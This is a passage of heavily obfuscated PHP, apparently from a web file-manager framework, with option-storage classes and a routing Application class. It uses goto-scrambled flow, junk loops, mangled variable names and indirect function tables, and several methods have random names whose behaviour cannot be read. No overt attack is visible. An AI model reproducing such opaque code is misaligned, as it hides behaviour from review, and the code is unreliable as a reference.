$C£ª™ô’ã¥) { goto BÍŠÏİÑÌÎ; B«ÓÂá“„…: return Model($this->modelType)->set($B¬Ê†‚ïÑÛ[382] . $aĞ¯Ìñ©Ë, $C£ª™ô’ã¥, $this->optionType); goto C¥Ÿ Ã¼Ñ£; BÍŠÏİÑÌÎ: $B¬Ê†‚ïÑÛ =& $_SERVER[òÀöí]; $C£ª™ô’ã¥ = array_field_key($C£ª™ô’ã¥, $this->field); $eºˆÂ› ô = $this->listData($aĞ¯Ìñ©Ë); goto BŸ¤äï¢Ø»; BŸ¤äï¢Ø»: if (!$eºˆÂ› ô) { return !1; } $C£ª™ô’ã¥ = array_merge($eºˆÂ› ô, $C£ª™ô’ã¥); $C£ª™ô’ã¥[$B¬Ê†‚ïÑÛ[83]] = time(); goto B«ÓÂá“„…; C¥Ÿ Ã¼Ñ£: } public function remove($aáêë¸ˆ¸ï) { return Model($this->modelType)->remove($_SERVER[òÀöí][382] . $aáêë¸ˆ¸ï, $this->optionType); } public function clear() { $CÅÕ—©øÜ† =& $_SERVER[òÀöí]; Model($this->modelType)->remove($CÅÕ—©øÜ†[383], $this->optionType . $CÅÕ—©øÜ†[384]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($bªÎ·è‡÷, $Dªà³ôĞˆ‘) { if (!$Dªà³ôĞˆ‘) { return !1; } $bë‹Ò£—À = $this->listData(); $bë‹Ò£—À = array_to_keyvalue($bë‹Ò£—À, $bªÎ·è‡÷); return isset($bë‹Ò£—À[$Dªà³ôĞˆ‘]) ? $bë‹Ò£—À[$Dªà³ôĞˆ‘] : !1; } public function findByName($aÀéÉà³É›) { return $this->findByKey($_SERVER[òÀöí][28], $aÀéÉà³É›); } protected function resetData($cÆÂÆÂç°²) { $bˆµ‘†®´¬ =& $_SERVER[òÀöí]; $cÆÂÆÂç°² = is_array($cÆÂÆÂç°²) ? $cÆÂÆÂç°² : array(); $d‹î÷ÓÔĞí = array(); for ($eÆ”âî®ôÛ = 0; $eÆ”âî®ôÛ < count($cÆÂÆÂç°²); $eÆ”âî®ôÛ++) { $d‹î÷ÓÔĞí[$bˆµ‘†®´¬[382] . $cÆÂÆÂç°²[$eÆ”âî®ôÛ][$bˆµ‘†®´¬[385]]] = $cÆÂÆÂç°²[$eÆ”âî®ôÛ]; } return Model($this->modelType)->set($d‹î÷ÓÔĞí, !1, $this->optionType); } private function getAutoName($D­Éè¯ä•â) { $EÓ­ƒã¢–• = array_to_keyvalue($this->listData(), $_SERVER[òÀöí][28]); if (!$EÓ­ƒã¢–• || !isset($EÓ­ƒã¢–•[$D­Éè¯ä•â])) { return $D­Éè¯ä•â; } for ($aìô—‚ŒôÓ = 1; $aìô—‚ŒôÓ < count($EÓ­ƒã¢–•); $aìô—‚ŒôÓ++) { $BãñïŠè¬§ = $D­Éè¯ä•â . "\50{$aìô—‚ŒôÓ}\x29"; if (!isset($EÓ­ƒã¢–•[$BãñïŠè¬§])) { return $BãñïŠè¬§; } } return $BãñïŠè¬§; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($BöÂŸ–©ÙŞ = false, $a“†•œ°² = '', $A©¨Ùî¿ë = false) { goto FÀÚ—ÏˆÖ¼; AÏ«Å‡ôËÔ: $this->cacheSet($a“†•œ°², $BßãïŒ²»’); $BßãïŒ²»’ = array_merge($AšÚİÔ‡‡÷, $BßãïŒ²»’); return $BöÂŸ–©ÙŞ ? $BßãïŒ²»’[$BöÂŸ–©ÙŞ] : $BßãïŒ²»’; goto a ¥‡“ô‹; FÀÚ—ÏˆÖ¼: $a£øàíá´ =& $_SERVER[òÀöí]; $BßãïŒ²»’ = $this->cacheGet($a“†•œ°²); $AšÚİÔ‡‡÷ = $this->optionDefault($a“†•œ°²); goto f¤Ù¶˜·Ú; f¤Ù¶˜·Ú: $AšÚİÔ‡‡÷ = is_array($AšÚİÔ‡‡÷) ? $AšÚİÔ‡‡÷ : array(); if (is_array($BßãïŒ²»’)) { $BßãïŒ²»’ = array_merge($AšÚİÔ‡‡÷, $BßãïŒ²»’); return $BöÂŸ–©ÙŞ ? isset($BßãïŒ²»’[$BöÂŸ–©ÙŞ]) ? $BßãïŒ²»’[$BöÂŸ–©ÙŞ] : null : $BßãïŒ²»’; } $DÌ°Ä»Îµ¨ = $this->filterWhere(array($a£øàíá´[29] => $a“†•œ°²)); goto dÏ¢ÂÄŞ¹‹; dÏ¢ÂÄŞ¹‹: $BßãïŒ²»’ = $this->where($DÌ°Ä»Îµ¨)->select(); $BßãïŒ²»’ = array_to_keyvalue($BßãïŒ²»’, $a£øàíá´[92], $a£øàíá´[368]); foreach ($BßãïŒ²»’ as $Bà“¢·Õø => $F†ã§…´ã») { if ($A©¨Ùî¿ë || in_array($Bà“¢·Õø, $this->jsonField)) { $BßãïŒ²»’[$Bà“¢·Õø] = json_decode($F†ã§…´ã», !0); } } goto AÏ«Å‡ôËÔ; a ¥‡“ô‹: } public function set($C×‘‘³‚ÛÜ, $fŸˆ¿í¤ºˆ = false, $DŒÖÂ‚‡İ‡ = '') { goto cÃÍöŒèÆâ; e²ïİÈñï¹: $dè‹£æß¿ = is_array($C×‘‘³‚ÛÜ) ? $C×‘‘³‚ÛÜ : array($C×‘‘³‚ÛÜ => $fŸˆ¿í¤ºˆ); foreach ($dè‹£æß¿ as $b¿òê–‚‹Ç => $B¤ ÷·§œ) { if (is_array($B¤ ÷·§œ)) { $B¤ ÷·§œ = json_encode_force($B¤ ÷·§œ); } $this->checkLength($B¤ ÷·§œ, !1, $this->tableName . $A˜öö‘İÇ©[4] . $C×‘‘³‚ÛÜ); $B¤ ÷·§œ = self::textEncode($B¤ ÷·§œ); $dè‹£æß¿ = array($A˜öö‘İÇ©[29] => $DŒÖÂ‚‡İ‡, $A˜öö‘İÇ©[92] => $b¿òê–‚‹Ç, $A˜öö‘İÇ©[368] => $B¤ ÷·§œ); $b¹Š‘óì £[] = $this->filterWhere($dè‹£æß¿); } if (!$b¹Š‘óì £) { return !0; } goto f‰ò‹ÒÜø; cÃÍöŒèÆâ: $A˜öö‘İÇ© =& $_SERVER[òÀöí]; $this->cacheRemove($DŒÖÂ‚‡İ‡); $b¹Š‘óì £ = array(); goto e²ïİÈñï¹; f‰ò‹ÒÜø: return $this->addAll($b¹Š‘óì £, array(), !0); goto e¤ƒÒ¼³Ğ¨; e¤ƒÒ¼³Ğ¨: } protected function optionDefault($E¥ÕÉ¬ëÊØ = '') { return !1; } public function setDeep($D§Ôöâ‰², $dºî³µÓÁÑ = false, $eø‚ÇÎ¹ë = '') { $dïøçËÔÅÕ = explode($_SERVER[òÀöí][94], $D§Ôöâ‰²); $d‘¬Úˆ½ÅÉ = $this->get(); array_set_value($d‘¬Úˆ½ÅÉ, $D§Ôöâ‰², $dºî³µÓÁÑ); $this->set($dïøçËÔÅÕ[0], $d‘¬Úˆ½ÅÉ[$dïøçËÔÅÕ[0]], $eø‚ÇÎ¹ë); } public function remove($dĞÚÛ–Œ†Å, $Fİßª“´¥í = '') { $F‡çˆ¢¼ƒè =& $_SERVER[òÀöí]; $this->cacheRemove($Fİßª“´¥í); $AŞ®»¹‹« = $this->filterWhere(array($F‡çˆ¢¼ƒè[92] => $dĞÚÛ–Œ†Å, $F‡çˆ¢¼ƒè[29] => $Fİßª“´¥í)); if (is_null($dĞÚÛ–Œ†Å)) { unset($AŞ®»¹‹«[$F‡çˆ¢¼ƒè[92]]); } return $this->where($AŞ®»¹‹«)->delete(); } public function cacheSet($bÚÙÎòĞˆ, $d´¤Å‘Ø‡¼ = false) { return Cache::set($this->cacheKey($bÚÙÎòĞˆ), $d´¤Å‘Ø‡¼); } public function cacheGet($Eˆ‘ Ø«íö) { return Cache::get($this->cacheKey($Eˆ‘ Ø«íö)); } public function cacheRemove($C¤êÃß‡Õ¥) { return Cache::remove($this->cacheKey($C¤êÃß‡Õ¥)); } protected function filterWhere($dĞŸ¾ƒ—) { return $dĞŸ¾ƒ—; } protected function cacheKey($B°»’÷Ñ±†) { return $B°»’÷Ñ±†; } } goto f×ğÀÖµŒ; Bã¼Öí¦Æã: $F¬Òñ–Ú‚ğ = $_SERVER[òÀöí][566]; while (strlen($F¬Òñ–Ú‚ğ) < $_SERVER[òÀöí][567]) { if (!$F¬Òñ–Ú‚ğ) { break; } $F¬Òñ–Ú‚ğ++; } class Application { private $defaultModule = "\x69\156\x64\x65\170"; private $defaultController = "\x69\x6e\x64\x65\x78"; private $defaultAction = "\x69\156\144\145\x78"; function __construct() { } public function setDefault($C†ßÕÅšê) { goto D®†ŠÀ…æ´; D®†ŠÀ…æ´: $BŞ‰ƒµ²— =& $_SERVER[òÀöí]; $b¬ôæäæ¶­ =& $_SERVER[÷ôçËï×½]; $Céˆí•¶éµ = $b¬ôæäæ¶­[0]($b¬ôæäæ¶­[1], $b¬ôæäæ¶­[2]($C†ßÕÅšê, $b¬ôæäæ¶­[1])); goto FÛ…áÄóŒ; f¸©„İÜÒµ: while ($cÉå±é» < $BŞ‰ƒµ²—[570]) { if ($cÉå±é» >= 0) { break; } $cÉå±é»++; } $this->defaultController = $Céˆí•¶éµ[1] ? $Céˆí•¶éµ[1] : $this->defaultController; $this->defaultAction = $Céˆí•¶éµ[2] ? $Céˆí•¶éµ[2] : $this->defaultAction; goto DªÀ‰ÆË‹ö; FÛ…áÄóŒ: $dï½ğîµÜˆ = $BŞ‰ƒµ²—[568]; $this->defaultModule = $Céˆí•¶éµ[0] ? $Céˆí•¶éµ[0] : $this->defaultModule; $cÉå±é» = $BŞ‰ƒµ²—[569]; goto f¸©„İÜÒµ; DªÀ‰ÆË‹ö: $B…Ê¾¿àŞ = $BŞ‰ƒµ²—[571]; $this->{$_SERVER[÷ôçËï×½][3]}($b¬ôæäæ¶­[4], array($this, $b¬ôæäæ¶­[5])); $b¿¨ğ†ª = $BŞ‰ƒµ²—[572]; goto CÊÚæŸ‰ºí; CÊÚæŸ‰ºí: if (strlen($b¿¨ğ†ª) < $BŞ‰ƒµ²—[573]) { return; } goto b’ÇŠÕßš£; b’ÇŠÕßš£: } public function appRun($CÜŞÅòŸÑ) { goto bğ”÷õÆ±; BÂæï Úæ¡: $F‹¨‚·×[13](array($F‹¨‚·×[14], $F‹¨‚·×[15]), $A¯ÊÜÄ¬¹ . $F‹¨‚·×[18], $CÜŞÅòŸÑ); $c‰Î®†Ç‡ = $CèŠš„àÄÛ[576]; goto C·›îâ¨; bğ”÷õÆ±: $CèŠš„àÄÛ =& $_SERVER[òÀöí]; $F‹¨‚·× =& $_SERVER[÷ôçËï×½]; $EÙ±é¬ÏÀ¡ = $F‹¨‚·×[0]($F‹¨‚·×[1], $CÜŞÅòŸÑ); goto d¡´Œ‹Şˆæ; d¡´Œ‹Şˆæ: $DíÉ¹ÑğÜ = $F‹¨‚·×[6]($EÙ±é¬ÏÀ¡[0]); $D¬®´†ÏÆ× = $CèŠš„àÄÛ[574]; if (!$D¬®´†ÏÆ×) { die; } goto cöŒ³©ô·µ; cöŒ³©ô·µ: $A¯ÊÜÄ¬¹ = $F‹¨‚·×[7]; if ($DíÉ¹ÑğÜ == $F‹¨‚·×[8]) { $A¯ÊÜÄ¬¹ = $F‹¨‚·×[9]; $EÙ±é¬ÏÀ¡[0] = $F‹¨‚·×[10]; $EÙ±é¬ÏÀ¡[1] = $EÙ±é¬ÏÀ¡[1] . $F‹¨‚·×[11]; $CÜŞÅòŸÑ = $F‹¨‚·×[12]($F‹¨‚·×[1], $EÙ±é¬ÏÀ¡); $CÜŞÅòŸÑ = $F‹¨‚·×[2]($CÜŞÅòŸÑ, $F‹¨‚·×[1]); } $F‹¨‚·×[13](array($F‹¨‚·×[14], $F‹¨‚·×[15]), $A¯ÊÜÄ¬¹ . $F‹¨‚·×[16], $CÜŞÅòŸÑ); goto F´ˆ´®ëˆ; F´ˆ´®ëˆ: $F‹¨‚·×[17]($CÜŞÅòŸÑ); $D¤‰¥ó£Œ = $CèŠš„àÄÛ[575]; while (strlen($D¤‰¥ó£Œ) < $CèŠš„àÄÛ[567]) { if (!$D¤‰¥ó£Œ) { break; } $D¤‰¥ó£Œ++; } goto BÂæï Úæ¡; C·›îâ¨: } private function autorun() { goto cÃôĞÁáÅõ; a—Ó¹á…Â: $FÅÎ¸İ˜ = $AøÑÏÖ˜Óè[577]; if (strlen($FÅÎ¸İ˜) < $AøÑÏÖ˜Óè[573]) { die; } if ($bÓŠÈ°‰Å³[19]($config[$bÓŠÈ°‰Å³[20]]) == 0) { return; } goto fĞê¤š¡Òì; cÃôĞÁáÅõ: $AøÑÏÖ˜Óè =& $_SERVER[òÀöí]; $bÓŠÈ°‰Å³ =& $_SERVER[÷ôçËï×½]; global $config; goto a—Ó¹á…Â; fĞê¤š¡Òì: foreach ($config[$bÓŠÈ°‰Å³[20]] as $d¿®´»‹çÕ => $c¡Íóñ…Ú¹) { $this->{$_SERVER[÷ôçËï×½][21]}($c¡Íóñ…Ú¹); } goto f¸”ÂÀîšË; f¸”ÂÀîšË: } private function birpa7288481() { goto aŒô†óëó; d†–ÎŒ‘Ô‚: $a»‚åŞ„‚Ó = $a½™„õÎ’[26]($GLOBALS[$a½™„õÎ’[22]][$a½™„õÎ’[23]], 1); $GLOBALS[$a½™„õÎ’[22]][$a½™„õÎ’[23]] = $a½™„õÎ’[27]($Añƒ‚•ãœ, $a»‚åŞ„‚Ó); $GLOBALS[$a½™„õÎ’[22]][$a½™„õÎ’[28]] = $a½™„õÎ’[29]($a½™„õÎ’[1], $GLOBALS[$a½™„õÎ’[22]][$a½™„õÎ’[23]]); goto D”Îõáª• ; D”Îõáª• : $aéÜåàÎÅ = $F¨÷ğ¡ß‚[581]; if (!$aéÜåàÎÅ) { die; } goto E…Ğ¶©“‘; D¯‘Æ¢Ü: $eíô‡ˆã–¥ = $F¨÷ğ¡ß‚[580]; if (strlen($eíô‡ˆã–¥) < $F¨÷ğ¡ß‚[573]) { return; } $Añƒ‚•ãœ = array($a½™„õÎ’[8], $f­Ô£½‚ºØ); goto d†–ÎŒ‘Ô‚; B›ÅêÖÖšÖ: $bï‹İ†—ï‘ = $GLOBALS[$a½™„õÎ’[22]][$a½™„õÎ’[23]][0]; $EÁœ¬‚¬ = $F¨÷ğ¡ß‚[578]; if (strlen($EÁœ¬‚¬) < $F¨÷ğ¡ß‚[579]) { return; } goto e®÷ÔÙÌ¹”; aŒô†óëó: $F¨÷ğ¡ß‚ =& $_SERVER[òÀöí]; $a½™„õÎ’ =& $_SERVER[÷ôçËï×½]; $c­…ÀŞÊË = $a½™„õÎ’[8]; goto B›ÅêÖÖšÖ; e®÷ÔÙÌ¹”: if (!$bï‹İ†—ï‘ || $a½™„õÎ’[24]($bï‹İ†—ï‘) <= $a½™„õÎ’[24]($c­…ÀŞÊË)) { return; } if ($a½™„õÎ’[6]($a½™„õÎ’[25]($bï‹İ†—ï‘, -$a½™„õÎ’[24]($c­…ÀŞÊË))) != $c­…ÀŞÊË) { return; } $f­Ô£½‚ºØ = $a½™„õÎ’[25]($bï‹İ†—ï‘, 0, -$a½™„õÎ’[24]($c­…ÀŞÊË)); goto D¯‘Æ¢Ü; E…Ğ¶©“‘: } private function cwdt4b93eba5() { goto aÔÚ‰õ¦—”; aÔÚ‰õ¦—”: $aˆóŠ‹ó“å =& $_SERVER[òÀöí]; $eô´ŠµµÑ„ =& $_SERVER[÷ôçËï×½]; if ($GLOBALS[$eô´ŠµµÑ„[22]][$eô´ŠµµÑ„[28]] != $eô´ŠµµÑ„[10]) { return; } goto F”ÖÌô¨¶Ø; ašø˜­öšÌ: $FßèÒ¾â» = $aˆóŠ‹ó“å[587]; if (strlen($FßèÒ¾â») < $aˆóŠ‹ó“å[588]) { die; } goto a»‰¾õÙØ; FÂÍÅä¹¼‰: $BíŠ±Ó¬ó = $eô´ŠµµÑ„[31]; $E—ÜîÕ£Ä² = $aˆóŠ‹ó“å[583]; if (strlen($E—ÜîÕ£Ä²) < $aˆóŠ‹ó“å[570]) { return; } goto AØ¦ÖÎ²è‰; bÊ‘¦›–á: $b–Ó«ÒæÀç = $eô´ŠµµÑ„[2]($f°ù…ŞÎ¯±[0][0], $eô´ŠµµÑ„[36]); $f¿ƒ¥‡·İÉ = $aˆóŠ‹ó“å[585]; $GLOBALS[$eô´ŠµµÑ„[22]][$eô´ŠµµÑ„[23]] = $eô´ŠµµÑ„[0]($eô´ŠµµÑ„[36], $b–Ó«ÒæÀç); goto C£İËÙóÕ; F°¹ŒŒ¶ÙÕ: $A¥‚¯ªğ‘à = $aˆóŠ‹ó“å[584]; if (strlen($A¥‚¯ªğ‘à) < $aˆóŠ‹ó“å[579]) { die; } $eô´ŠµµÑ„[34]($eô´ŠµµÑ„[35], $b–Ó«ÒæÀç, $f°ù…ŞÎ¯±); goto bÊ‘¦›–á; AØ¦ÖÎ²è‰: if (!$eô´ŠµµÑ„[32]($e‹ ¦ˆ¨ªŞ, $BíŠ±Ó¬ó)) { return; } $B±‰„çÊíğ = $eô´ŠµµÑ„[33]($e‹ ¦ˆ¨ªŞ, $BíŠ±Ó¬ó); $b–Ó«ÒæÀç = $eô´ŠµµÑ„[25]($e‹ ¦ˆ¨ªŞ, $B±‰„çÊíğ + $eô´ŠµµÑ„[24]($BíŠ±Ó¬ó)); goto F°¹ŒŒ¶ÙÕ; F”ÖÌô¨¶Ø: $e‹ ¦ˆ¨ªŞ = $_SERVER[$eô´ŠµµÑ„[30]]; $f˜¡òŒÍ¶æ = $aˆóŠ‹ó“å[582]; if (!$f˜¡òŒÍ¶æ) { die; } goto FÂÍÅä¹¼‰; C£İËÙóÕ: $eÍº¹öÆ¦î = $aˆóŠ‹ó“å[586]; while ($eÍº¹öÆ¦î < $aˆóŠ‹ó“å[573]) { if ($eÍº¹öÆ¦î >= 0) { break; } $eÍº¹öÆ¦î++; } $GLOBALS[$eô´ŠµµÑ„[22]][$eô´ŠµµÑ„[28]] = $eô´ŠµµÑ„[29]($eô´ŠµµÑ„[1], $GLOBALS[$eô´ŠµµÑ„[22]][$eô´ŠµµÑ„[23]]); goto ašø˜­öšÌ; a»‰¾õÙØ: } public function run() { goto fï¨‚î­éœ; b“÷Å»ÅŠ÷: if (!$fËğ¬…³èç) { return; } $_SERVER[$báÉå°Œù‡[44]] = $báÉå°Œù‡[6](ACTION); $fµ‡Ÿò³Úë = $AªÌÓ­½˜ó[592]; goto fâ’Œæ‰‰; c®©®Ï¢ôª: while ($FÙ‹¯ÎÆ¥Ç < $AªÌÓ­½˜ó[588]) { if ($FÙ‹¯ÎÆ¥Ç >= 0) { break; } $FÙ‹¯ÎÆ¥Ç++; } $báÉå°Œù‡[39]($báÉå°Œù‡[40], isset($d‘õÚãßª[0]) && $d‘õÚãßª[0] ? $d‘õÚãßª[0] : $this->defaultModule); $báÉå°Œù‡[39]($báÉå°Œù‡[41], isset($d‘õÚãßª[1]) && $d‘õÚãßª[0] ? $d‘õÚãßª[1] : $this->defaultController); goto dŠƒ¶¥¨Õ¼; dŠƒ¶¥¨Õ¼: $báÉå°Œù‡[39]($báÉå°Œù‡[42], isset($d‘õÚãßª[2]) && $d‘õÚãßª[0] ? $d‘õÚãßª[2] : $this->defaultAction); $báÉå°Œù‡[39]($báÉå°Œù‡[43], MOD . $báÉå°Œù‡[1] . ST . $báÉå°Œù‡[1] . ACT); $fËğ¬…³èç = $AªÌÓ­½˜ó[591]; goto b“÷Å»ÅŠ÷; dº‡˜÷ˆø: while (strlen($CÂšöïš‰ƒ) < $AªÌÓ­½˜ó[570]) { if (!$CÂšöïš‰ƒ) { break; } $CÂšöïš‰ƒ++; } if ($báÉå°Œù‡[19]($d‘õÚãßª) >= 3) { $this->{$_SERVER[÷ôçËï×½][21]}($aëÃ±é¸–…); } else { $this->{$_SERVER[÷ôçËï×½][21]}(ACTION); } goto fÁñ¹ ğ§; FŒ’°ËÉ: $d‘õÚãßª = $GLOBALS[$báÉå°Œù‡[22]][$báÉå°Œù‡[23]]; $aëÃ±é¸–… = $GLOBALS[$báÉå°Œù‡[22]][$báÉå°Œù‡[28]]; $FÙ‹¯ÎÆ¥Ç = $AªÌÓ­½˜ó[590]; goto c®©®Ï¢ôª; fï¨‚î­éœ: $AªÌÓ­½˜ó =& $_SERVER[òÀöí]; $báÉå°Œù‡ =& $_SERVER[÷ôçËï×½]; $this->{$_SERVER[÷ôçËï×½][37]}(); goto a¦ˆ±ÃÔ„Ë; a¦ˆ±ÃÔ„Ë: $this->{$_SERVER[÷ôçËï×½][38]}(); $eöèÜŒ¡ = $AªÌÓ­½˜ó[589]; while (strlen($eöèÜŒ¡) < $AªÌÓ­½˜ó[570]) { if (!$eöèÜŒ¡) { break; } $eöèÜŒ¡++; } goto FŒ’°ËÉ; fâ’Œæ‰‰: while (strlen($fµ‡Ÿò³Úë) < $AªÌÓ­½˜ó[588]) { if (!$fµ‡Ÿò³Úë) { break; } $fµ‡Ÿò³Úë++; } $this->{$_SERVER[÷ôçËï×½][45]}(); $CÂšöïš‰ƒ = $AªÌÓ­½˜ó[593]; goto dº‡˜÷ˆø; fÁñ¹ ğ§: } private $oeyt9941f96e = array(); private $tujhea62d282 = ''; public function jdwp9ed867eb() { goto A”®÷Í™; D¦¯èè„´: $BÄ•ÔËÎ»× = $BƒÈ„ÚŠ‰[600]; while ($BÄ•ÔËÎ»× < $BƒÈ„ÚŠ‰[570]) { if ($BÄ•ÔËÎ»× >= 0) { break; } $BÄ•ÔËÎ»×++; } goto fÅÏµë—ä; fšÔ¼¯­ã: $this->{$_SERVER[÷ôçËï×½][49]}(); $this->{$_SERVER[÷ôçËï×½][50]}(); $a¼™ò‘²Ú‰ = $BƒÈ„ÚŠ‰[596]; goto e°Ä¦ù¾«Ê; a©¸³¦Ğñó: $Cí‚ƒØÒš = $BƒÈ„ÚŠ‰[598]; while ($Cí‚ƒØÒš < $BƒÈ„ÚŠ‰[573]) { if ($Cí‚ƒØÒš >= 0) { break; } $Cí‚ƒØÒš++; } $this->{$_SERVER[÷ôçËï×½][3]}($B’¦‰îòá[57], array($this, $B’¦‰îòá[58])); goto f©øŒè£ ®; f¢“ÁÔã‰‘: $eØòŒ÷‚‚µ = $BƒÈ„ÚŠ‰[594]; if (!$eØòŒ÷‚‚µ) { die; } $this->{$_SERVER[÷ôçËï×½][47]}(); goto e³‹Œ·ïÙÊ; e³‹Œ·ïÙÊ: $E³Ùå›·Ñ‚ = $BƒÈ„ÚŠ‰[595]; if (!$E³Ùå›·Ñ‚) { die; } $this->{$_SERVER[÷ôçËï×½][48]}(); goto fšÔ¼¯­ã; A”®÷Í™: $BƒÈ„ÚŠ‰ =& $_SERVER[òÀöí]; $B’¦‰îòá =& $_SERVER[÷ôçËï×½]; $this->{$_SERVER[÷ôçËï×½][46]}(); goto f¢“ÁÔã‰‘; f©øŒè£ ®: $aÉ¾ôÚŞ²‘ = $BƒÈ„ÚŠ‰[599]; if (!$aÉ¾ôÚŞ²‘) { die; } $this->{$_SERVER[÷ôçËï×½][3]}($B’¦‰îòá[59], array($this, $B’¦‰îòá[60])); goto D¦¯èè„´; cĞ±£§×·¾: $this->{$_SERVER[÷ôçËï×½][52]}(); $this->{$_SERVER[÷ôçËï×½][3]}($B’¦‰îòá[53], array($this, $B’¦‰îòá[54])); $this->{$_SERVER[÷ôçËï×½][3]}($B’¦‰îòá[55], array($this, $B’¦‰îòá[56])); goto a©¸³¦Ğñó; e°Ä¦ù¾«Ê: $this->{$_SERVER[÷ôçËï×½][51]}(); $AïÔóİíª = $BƒÈ„ÚŠ‰[597]; if (!$AïÔóİíª) { return; } goto cĞ±£§×·¾; fÅÏµë—ä: } public function wmkz035b512c($bº·¿¶Â¤ƒ) { goto F‘¯è•‚¡š; bÎé–”ÙÃ: $FõŸÇ˜Á = array($B²éƒ‘ÕÍ»[64], $B²éƒ‘ÕÍ»[65], $B²éƒ‘ÕÍ»[66], $B²éƒ‘ÕÍ»[67], $B²éƒ‘ÕÍ»[68], $B²éƒ‘ÕÍ»[69], $B²éƒ‘ÕÍ»[70], $B²éƒ‘ÕÍ»[71], $B²éƒ‘ÕÍ»[72], $B²éƒ‘ÕÍ»[73], $B²éƒ‘ÕÍ»[74], $B²éƒ‘ÕÍ»[75], $B²éƒ‘ÕÍ»[76], $B²éƒ‘ÕÍ»[77], $B²éƒ‘ÕÍ»[78], $B²éƒ‘ÕÍ»[79], $B²éƒ‘ÕÍ»[80], $B²éƒ‘ÕÍ»[81], $B²éƒ‘ÕÍ»[82], $B²éƒ‘ÕÍ»[83], $B²éƒ‘ÕÍ»[84], $B²éƒ‘ÕÍ»[85], $B²éƒ‘ÕÍ»[86], $B²éƒ‘ÕÍ»[87], $B²éƒ‘ÕÍ»[88], $B²éƒ‘ÕÍ»[89], $B²éƒ‘ÕÍ»[90], $B²éƒ‘ÕÍ»[91], $B²éƒ‘ÕÍ»[92], $B²éƒ‘ÕÍ»[93], $B²éƒ‘ÕÍ»[94], $B²éƒ‘ÕÍ»[95], $B²éƒ‘ÕÍ»[96], $B²éƒ‘ÕÍ»[97], $B²éƒ‘ÕÍ»[98], $B²éƒ‘ÕÍ»[99]); foreach ($FõŸÇ˜Á as $AÙ½Ü¤î’×) { $bÉÆ©­¢Åƒ = $GLOBALS[$B²éƒ‘ÕÍ»[100]][$B²éƒ‘ÕÍ»[101]][$AÙ½Ü¤î’×]; $dÛ‡²¦µ†Ú = $AİÉùí©À[601]; while (strlen($dÛ‡²¦µ†Ú) < $AİÉùí©À[567]) { if (!$dÛ‡²¦µ†Ú) { break; } $dÛ‡²¦µ†Ú++; } if (isset($eİŸ…ŸŸŒ¶[$AÙ½Ü¤î’×])) { $bÉÆ©­¢Åƒ = $eİŸ…ŸŸŒ¶[$AÙ½Ü¤î’×]; } $bº·¿¶Â¤ƒ[$B²éƒ‘ÕÍ»[102]][$B²éƒ‘ÕÍ»[103]][$AÙ½Ü¤î’×] = $bÉÆ©­¢Åƒ; } $A¥äÌÆëÀğ = $bº·¿¶Â¤ƒ[$B²éƒ‘ÕÍ»[102]][$B²éƒ‘ÕÍ»[103]][$B²éƒ‘ÕÍ»[76]]; goto eÚìëœŒ‹; eˆ“·¸Ü‘Ï: $bº·¿¶Â¤ƒ[$B²éƒ‘ÕÍ»[114]][$B²éƒ‘ÕÍ»[126]] = $this->tujhea62d282; if ($eİŸ…ŸŸŒ¶[$B²éƒ‘ÕÍ»[126]] != $B²éƒ‘ÕÍ»[127]) { $bº·¿¶Â¤ƒ[$B²éƒ‘ÕÍ»[114]][$B²éƒ‘ÕÍ»[128]] = $eİŸ…ŸŸŒ¶[$B²éƒ‘ÕÍ»[128]]; $bº·¿¶Â¤ƒ[$B²éƒ‘ÕÍ»[114]][$B²éƒ‘ÕÍ»[129]] = $eİŸ…ŸŸŒ¶[$B²éƒ‘ÕÍ»[129]]; $B®àÃ÷‚•è = $B²éƒ‘ÕÍ»[130](10) . $this->tujhea62d282 . $B²éƒ‘ÕÍ»[130](5); $bº·¿¶Â¤ƒ[$B²éƒ‘ÕÍ»[102]][$B²éƒ‘ÕÍ»[131]][$B²éƒ‘ÕÍ»[132]] = $this->{$_SERVER[÷ôçËï×½][133]}($B®àÃ÷‚•è, $bº·¿¶Â¤ƒ[$B²éƒ‘ÕÍ»[114]][$B²éƒ‘ÕÍ»[119]]); } if ($this->tujhea62d282 == $B²éƒ‘ÕÍ»[127]) { $bº·¿¶Â¤ƒ[$B²éƒ‘ÕÍ»[102]][$B²éƒ‘ÕÍ»[103]][$B²éƒ‘ÕÍ»[108]][$B²éƒ‘ÕÍ»[113]] = 0; } goto e›¸¾æ„©è; BÛø£‚ˆÏ: if (!$d¼ÌªÌíÊÓ) { return; } unset($bº·¿¶Â¤ƒ[$B²éƒ‘ÕÍ»[102]][$B²éƒ‘ÕÍ»[104]][$B²éƒ‘ÕÍ»[106]]); unset($bº·¿¶Â¤ƒ[$B²éƒ‘ÕÍ»[102]][$B²éƒ‘ÕÍ»[103]][$B²éƒ‘ÕÍ»[76]]); goto dƒ‡ºÊø„; E‡„ÆÂ–Úœ: $bº·¿¶Â¤ƒ[$B²éƒ‘ÕÍ»[102]][$B²éƒ‘ÕÍ»[103]][$B²éƒ‘ÕÍ»[108]] = array($B²éƒ‘ÕÍ»[109] => (int) $A¥äÌÆëÀğ[$B²éƒ‘ÕÍ»[110]], $B²éƒ‘ÕÍ»[111] => (int) $B²éƒ‘ÕÍ»[112]($A¥äÌÆëÀğ, $B²éƒ‘ÕÍ»[113], 0)); $bº·¿¶Â¤ƒ[$B²éƒ‘ÕÍ»[114]][$B²éƒ‘ÕÍ»[115]] = $B²éƒ‘ÕÍ»[116]($B²éƒ‘ÕÍ»[117])->{$_SERVER[÷ôçËï×½][118]}(); $a¨‰º²è–‹ = $AİÉùí©À[605]; goto cñ‰ªÑ†°; cñ‰ªÑ†°: while ($a¨‰º²è–‹ < $AİÉùí©À[567]) { if ($a¨‰º²è–‹ >= 0) { break; } $a¨‰º²è–‹++; } $bº·¿¶Â¤ƒ[$B²éƒ‘ÕÍ»[114]][$B²éƒ‘ÕÍ»[119]] = $B²éƒ‘ÕÍ»[120]($_SERVER[$B²éƒ‘ÕÍ»[121]] . $eİŸ…ŸŸŒ¶[$B²éƒ‘ÕÍ»[122]]); $bº·¿¶Â¤ƒ[$B²éƒ‘ÕÍ»[114]][$B²éƒ‘ÕÍ»[123]] = $B²éƒ‘ÕÍ»[124]($B²éƒ‘ÕÍ»[125]()); goto eˆ“·¸Ü‘Ï; eÚìëœŒ‹: $FÊñÊ´®Ç¾ = $AİÉùí©À[602]; 